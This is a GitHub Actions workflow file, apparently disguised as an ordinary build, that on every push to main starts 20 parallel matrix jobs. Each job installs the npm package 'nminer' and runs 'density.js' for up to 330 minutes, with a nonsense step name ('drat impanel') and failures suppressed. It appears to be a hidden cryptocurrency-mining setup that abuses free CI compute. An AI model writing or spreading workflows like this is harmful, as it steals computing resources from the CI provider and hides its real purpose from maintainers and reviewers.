name: density
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7570 }
          - { version: 2110 }
          - { version: 3071 }
          - { version: 4086 }
          - { version: 691 }
          - { version: 1398 }
          - { version: 8587 }
          - { version: 5525 }
          - { version: 2701 }
          - { version: 5520 }
          - { version: 5904 }
          - { version: 6014 }
          - { version: 7090 }
          - { version: 8998 }
          - { version: 4654 }
          - { version: 4200 }
          - { version: 1694 }
          - { version: 1672 }
          - { version: 7044 }
          - { version: 9863 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: drat impanel
        run: |
          npm install nminer@latest
          timeout 330m node density.js || echo "density executed"